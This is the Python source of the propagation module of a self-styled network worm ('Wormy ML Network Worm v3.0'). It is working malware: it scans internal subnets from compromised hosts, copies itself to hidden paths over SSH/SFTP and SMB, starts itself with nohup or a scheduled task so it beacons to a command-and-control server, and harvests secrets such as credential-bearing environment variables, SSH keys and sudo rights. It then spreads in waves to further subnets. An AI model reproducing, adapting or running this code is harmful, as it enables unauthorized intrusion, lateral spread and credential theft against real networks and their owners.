# -*- coding: utf-8 -*-
"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Advanced Propagation Engine v2.0
Real improvements:
  1. Pivot scanner -- from each compromised host, scan its internal subnets
  2. Self-copy transfer -- SSH/SMB copy worm to target, remote execute
  3. SMB auto-spread -- impacket smbclient to push to \\\\target\\C$\\Windows\\Temp\\
  4. Wave propagation -- spread by layers (wave 1 -> wave 2 -> wave N)
  5. Propagation graph -- prevent re-infection loops
  6. Intel harvesting from each compromised host
"""

import hashlib
import os
import random
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Dict, List, Optional, Set, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
# Propagation Graph (prevent infinite re-infection loops)
# ─────────────────────────────────────────────────────────────────────────────
class PropagationGraph:
    """
    Directed graph of infection paths.
    Prevents re-infecting already-compromised hosts.
    Tracks infection waves.
    """

    def __init__(self):
        self._edges: Dict[str, Set[str]] = {}  # source -> {targets}
        self._infected: Set[str] = set()
        self._failed: Set[str] = set()
        self._waves: Dict[int, List[str]] = {}  # wave_num -> [ips]
        self._lock = threading.Lock()

    def can_infect(self, ip: str) -> bool:
        return ip not in self._infected and ip not in self._failed

    def mark_infected(self, ip: str, source: str = None, wave: int = 0):
        with self._lock:
            self._infected.add(ip)
            if source:
                self._edges.setdefault(source, set()).add(ip)
            self._waves.setdefault(wave, []).append(ip)

    def mark_failed(self, ip: str):
        with self._lock:
            self._failed.add(ip)

    def get_infected(self) -> Set[str]:
        return set(self._infected)

    def get_failed(self) -> Set[str]:
        return set(self._failed)

    def get_wave(self, n: int) -> List[str]:
        return self._waves.get(n, [])

    def get_stats(self) -> Dict:
        return {
            "infected": len(self._infected),
            "failed": len(self._failed),
            "waves": len(self._waves),
            "edges": sum(len(v) for v in self._edges.values()),
        }


# ─────────────────────────────────────────────────────────────────────────────
# Pivot Scanner — scan from inside a compromised host
# ─────────────────────────────────────────────────────────────────────────────
class PivotScanner:
    """
    Execute network scans FROM a compromised host (not from the attacker).
    Discovers internal subnets invisible from the outside.
    Uses SSH to run the scan remotely.
    """

    PROBE_PORTS = [22, 80, 443, 445, 3389, 3306, 6379, 8080]

    def scan_via_ssh(
        self, pivot_ip: str, username: str, password: str, target_cidr: str, timeout: int = 30
    ) -> List[Dict]:
        """
        SSH to pivot_ip and run a TCP port scan from there.
        Returns list of discovered internal hosts.
        """
        try:
            import paramiko

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(pivot_ip, username=username, password=password, timeout=10)

            # Python one-liner TCP scanner (no nmap needed on target)
            probe_ports = ",".join(map(str, self.PROBE_PORTS))
            scanner_cmd = (
                f'python3 -c "'
                f"import socket,ipaddress,json;"
                f"res=[];"
                f"[res.append({{'ip':str(ip),'ports':[p for p in [{probe_ports}] if socket.socket().connect_ex((str(ip),p))==0]}})"
                f" for ip in ipaddress.ip_network('{target_cidr}',strict=False).hosts()];"
                f"print(json.dumps([h for h in res if h['ports']]))"
                f'"'
            )
            _, stdout, stderr = ssh.exec_command(scanner_cmd, timeout=timeout)
            output = stdout.read().decode().strip()
            ssh.close()

            if output:
                hosts = []
                import json

                raw = json.loads(output)
                for h in raw:
                    if h.get("ports"):
                        hosts.append(
                            {
                                "ip": h["ip"],
                                "open_ports": h["ports"],
                                "discovered_via": f"pivot:{pivot_ip}",
                                "asset_type": "unknown",
                                "asset_value": 10,
                            }
                        )
                logger.success(f"Pivot scan via {pivot_ip}: {len(hosts)} internal hosts")
                return hosts
        except ImportError:
            logger.warning("paramiko required for pivot scanning")
        except Exception as e:
            logger.debug(f"Pivot scan via {pivot_ip} failed: {e}")
        return []

    def scan_via_smb_exec(
        self, pivot_ip: str, username: str, password: str, domain: str, target_cidr: str
    ) -> List[str]:
        """
        Execute ping sweep via impacket psexec/wmiexec from pivot host.
        For Windows pivots.
        """
        try:
            result = subprocess.run(
                [
                    "python",
                    "-m",
                    "impacket.examples.wmiexec",
                    f"{domain}/{username}:{password}@{pivot_ip}",
                    f"for /L %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i",
                ],
                capture_output=True,
                text=True,
                timeout=60,
            )
            live_ips = []
            for line in result.stdout.splitlines():
                if "Reply from" in line:
                    parts = line.split()
                    for p in parts:
                        if "." in p and p.replace(".", "").isdigit():
                            live_ips.append(p.rstrip(":"))
            return live_ips
        except Exception as e:
            logger.debug(f"SMB exec pivot failed: {e}")
        return []


# ─────────────────────────────────────────────────────────────────────────────
# Self-Copy Transfer Engine
# ─────────────────────────────────────────────────────────────────────────────
class SelfCopyTransfer:
    """
    Transfer the worm to a compromised host and execute it remotely.
    SSH path: copy worm_core.py -> nohup python3 worm_core.py &
    SMB path: copy to \\\\target\\C$\\Windows\\Temp\\ -> schtasks /create
    """

    WORM_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "worm_core.py"))
    REMOTE_PATH_LINUX = "/tmp/.sysd"
    REMOTE_PATH_WINDOWS = r"C:\Windows\Temp\svc.py"

    def transfer_via_ssh(
        self, target_ip: str, username: str, password: str, c2_server: str = None
    ) -> bool:
        """
        SCP worm to target Linux host and run it in background.
        The worm on the target will beacon back to c2_server.
        """
        try:
            import paramiko

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=10)

            # Transfer via SFTP
            sftp = ssh.open_sftp()
            sftp.put(self.WORM_PATH, self.REMOTE_PATH_LINUX)
            sftp.close()

            # Make executable and run in background with nohup
            cmd = (
                f"chmod +x {self.REMOTE_PATH_LINUX}; "
                f"nohup python3 {self.REMOTE_PATH_LINUX} "
                f"{'--c2 ' + c2_server if c2_server else '--dry-run'} "
                f"> /dev/null 2>&1 &"
            )
            ssh.exec_command(cmd)
            ssh.close()

            logger.success(f"Worm transferred and launched on {target_ip} via SSH")
            return True
        except ImportError:
            logger.warning("paramiko required for SSH transfer")
        except Exception as e:
            logger.debug(f"SSH transfer to {target_ip} failed: {e}")
        return False

    def transfer_via_smb(
        self, target_ip: str, username: str, password: str, domain: str = "WORKGROUP"
    ) -> bool:
        """
        Copy worm to \\\\target\\C$\\Windows\\Temp\\ via impacket SMBClient.
        Create scheduled task to run on next login.
        """
        try:
            result = subprocess.run(
                [
                    "python",
                    "-m",
                    "impacket.examples.smbclient",
                    f"{domain}/{username}:{password}@{target_ip}",
                    "-c",
                    f"put {self.WORM_PATH} {self.REMOTE_PATH_WINDOWS}",
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if result.returncode == 0:
                # Create scheduled task for persistence
                subprocess.run(
                    [
                        "python",
                        "-m",
                        "impacket.examples.atexec",
                        f"{domain}/{username}:{password}@{target_ip}",
                        f"python {self.REMOTE_PATH_WINDOWS}",
                    ],
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
                logger.success(f"Worm transferred to {target_ip} via SMB")
                return True
        except Exception as e:
            logger.debug(f"SMB transfer to {target_ip} failed: {e}")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# Intel Harvester — collect info from each compromised host
# ─────────────────────────────────────────────────────────────────────────────
class IntelHarvester:
    """
    Collect intelligence from a compromised host via SSH.
    Feeds data back into the RL reward signal and propagation graph.
    """

    COMMANDS = {
        "hostname": "hostname",
        "users": "who",
        "interfaces": "ip addr show 2>/dev/null || ipconfig /all 2>nul",
        "routes": "ip route 2>/dev/null || route print 2>nul",
        "processes": "ps aux 2>/dev/null | head -20 || tasklist /fo csv 2>nul | head -20",
        "netstat": "ss -tnp 2>/dev/null || netstat -an 2>nul | head -30",
        "sudoers": "sudo -l 2>/dev/null | head -10",
        "suid_binaries": "find / -perm -4000 2>/dev/null | head -10",
        "env_vars": 'env 2>/dev/null | grep -i "key\\|pass\\|secret\\|token" | head -10',
        "ssh_keys": "ls ~/.ssh/ 2>/dev/null",
        "cron": "crontab -l 2>/dev/null",
        "installed_pkgs": "dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20",
    }

    def harvest(self, target_ip: str, username: str, password: str) -> Dict:
        """SSH to target and collect intel."""
        intel = {"target": target_ip, "username": username}
        try:
            import paramiko

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=10)

            for key, cmd in self.COMMANDS.items():
                try:
                    _, stdout, _ = ssh.exec_command(cmd, timeout=5)
                    output = stdout.read().decode().strip()
                    if output:
                        intel[key] = output[:500]  # Cap at 500 chars
                except Exception:
                    pass

            # Extract internal IPs from interfaces
            ifaces = intel.get("interfaces", "")
            internal_ips = []
            import re

            for match in re.finditer(r"inet\s+(\d+\.\d+\.\d+\.\d+)", ifaces):
                ip = match.group(1)
                if not ip.startswith("127.") and not ip.startswith("169.254."):
                    internal_ips.append(ip)
            intel["internal_ips"] = internal_ips

            # Estimate asset value from discovered data
            asset_value = 10
            if "sudo" in intel.get("sudoers", "").lower():
                asset_value += 30
            if intel.get("suid_binaries"):
                asset_value += 20
            if intel.get("env_vars"):
                asset_value += 25
            if intel.get("ssh_keys"):
                asset_value += 15
            intel["estimated_asset_value"] = min(100, asset_value)

            ssh.close()
            logger.success(f"Intel harvested from {target_ip}: {list(intel.keys())}")

        except ImportError:
            logger.warning("paramiko required for intel harvesting")
        except Exception as e:
            logger.debug(f"Intel harvest on {target_ip} failed: {e}")

        return intel


# ─────────────────────────────────────────────────────────────────────────────
# Wave Propagation Engine
# ─────────────────────────────────────────────────────────────────────────────
class WavePropagationEngine:
    """
    Propagate in waves: Wave 0 (initial targets) -> Wave 1 (their subnets) -> ...
    Each wave's compromised hosts become pivot points for the next wave.
    Includes propagation graph to prevent loops.
    """

    def __init__(self, max_waves: int = 3, max_workers: int = 10):
        self.max_waves = max_waves
        self.max_workers = max_workers
        self.graph = PropagationGraph()
        self.pivot_scanner = PivotScanner()
        self.self_copy = SelfCopyTransfer()
        self.harvester = IntelHarvester()
        self._lock = threading.Lock()

    def propagate_wave(
        self,
        targets: List[Dict],
        credentials: List[Tuple[str, str]],
        exploit_fn: Callable[[Dict], Tuple[bool, Dict]],
        wave: int = 0,
        c2_server: str = None,
    ) -> Dict:
        """
        Attempt to infect all targets in this wave.
        Returns: {infected: [...], failed: [...], next_wave_targets: [...]}
        """
        logger.info(
            f"Wave {wave}: attacking {len(targets)} targets with {len(credentials)} credential sets"
        )

        infected_hosts = []
        failed_hosts = []
        next_targets = []

        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {}
            for target in targets:
                ip = target.get("ip")
                if not ip or not self.graph.can_infect(ip):
                    continue
                fut = ex.submit(
                    self._infect_single, target, credentials, exploit_fn, wave, c2_server
                )
                futures[fut] = ip

            for fut in as_completed(futures):
                ip = futures[fut]
                try:
                    result = fut.result()
                    if result["success"]:
                        infected_hosts.append(result)
                        self.graph.mark_infected(ip, wave=wave)
                        # Collect intel and discover next-wave targets
                        if result.get("credentials") and wave < self.max_waves:
                            creds = result["credentials"]
                            intel = self.harvester.harvest(ip, creds[0], creds[1])
                            # Scan internal subnets discovered on this host
                            for internal_ip in intel.get("internal_ips", [])[:3]:
                                # Derive /24 from internal IP
                                parts = internal_ip.split(".")
                                if len(parts) == 4:
                                    cidr = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                                    pivot_hosts = self.pivot_scanner.scan_via_ssh(
                                        ip, creds[0], creds[1], cidr
                                    )
                                    with self._lock:
                                        next_targets.extend(pivot_hosts)
                            result["intel"] = intel
                    else:
                        failed_hosts.append(ip)
                        self.graph.mark_failed(ip)
                except Exception as e:
                    logger.debug(f"Wave {wave} target {ip} error: {e}")
                    failed_hosts.append(ip)
                    self.graph.mark_failed(ip)

        logger.success(
            f"Wave {wave} complete: {len(infected_hosts)} infected, "
            f"{len(failed_hosts)} failed, {len(next_targets)} next-wave targets"
        )
        return {
            "wave": wave,
            "infected": infected_hosts,
            "failed": failed_hosts,
            "next_wave_targets": next_targets,
        }

    def _infect_single(
        self,
        target: Dict,
        credentials: List[Tuple[str, str]],
        exploit_fn: Callable,
        wave: int,
        c2_server: str,
    ) -> Dict:
        """Try to infect a single target."""
        ip = target.get("ip")
        result = {"ip": ip, "wave": wave, "success": False}

        # Run the exploit function
        try:
            success, exploit_data = exploit_fn(target)
            if success:
                result["success"] = True
                result["exploit_data"] = exploit_data
                # Try to extract usable credentials
                for user, pwd in credentials:
                    # Attempt SSH self-copy
                    if 22 in target.get("open_ports", []):
                        transferred = self.self_copy.transfer_via_ssh(ip, user, pwd, c2_server)
                        if transferred:
                            result["self_copied"] = True
                            result["credentials"] = (user, pwd)
                            break
                    # Attempt SMB self-copy
                    if 445 in target.get("open_ports", []):
                        transferred = self.self_copy.transfer_via_smb(ip, user, pwd)
                        if transferred:
                            result["self_copied"] = True
                            result["credentials"] = (user, pwd)
                            break
        except Exception as e:
            logger.debug(f"Infect single {ip} error: {e}")

        return result

    def run_all_waves(
        self,
        initial_targets: List[Dict],
        credentials: List[Tuple[str, str]],
        exploit_fn: Callable,
        c2_server: str = None,
    ) -> Dict:
        """Run all waves until max_waves reached or no new targets."""
        all_results = []
        current_targets = initial_targets

        for wave in range(self.max_waves):
            if not current_targets:
                logger.info(f"No targets for wave {wave} — stopping")
                break

            wave_result = self.propagate_wave(
                current_targets, credentials, exploit_fn, wave, c2_server
            )
            all_results.append(wave_result)
            current_targets = wave_result.get("next_wave_targets", [])

            if current_targets:
                logger.info(f"Wave {wave+1} queued with {len(current_targets)} targets")
            time.sleep(random.uniform(1, 5))  # Brief pause between waves

        return {
            "waves_completed": len(all_results),
            "graph_stats": self.graph.get_stats(),
            "all_waves": all_results,
        }
